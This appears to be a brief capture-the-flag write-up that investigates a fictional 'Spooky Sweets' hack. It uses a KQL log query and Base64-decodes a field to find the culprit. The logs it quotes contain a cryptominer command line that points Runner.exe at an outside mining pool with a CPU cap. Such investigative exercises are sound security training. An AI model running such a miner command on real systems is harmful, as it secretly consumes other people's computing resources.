S2q18

Who really hacked Spooky Sweets?



ProcessEvents
| where process_commandline  contains  "Runner.exe"
| project timestamp, username, process_commandline
| distinct process_commandline

Runner.exe -a cryptonight-heavy --url=witchs.coven.rocks:666 -u SGFja2VkIGJ5IHRoZSBXaXRjaCdzIENvdmVu -R --variant=-1 --max-cpu-usage=75

The Runner.exe command line contains:

-u SGFja2VkIGJ5IHRoZSBXaXRjaCdzIENvdmVu

That value is Base64 encoded.

Decoding:

SGFja2VkIGJ5IHRoZSBXaXRjaCdzIENvdmVu

becomes:

Hacked by the Witch's Coven

/// response is the Witch's Coven

the challenge is done 








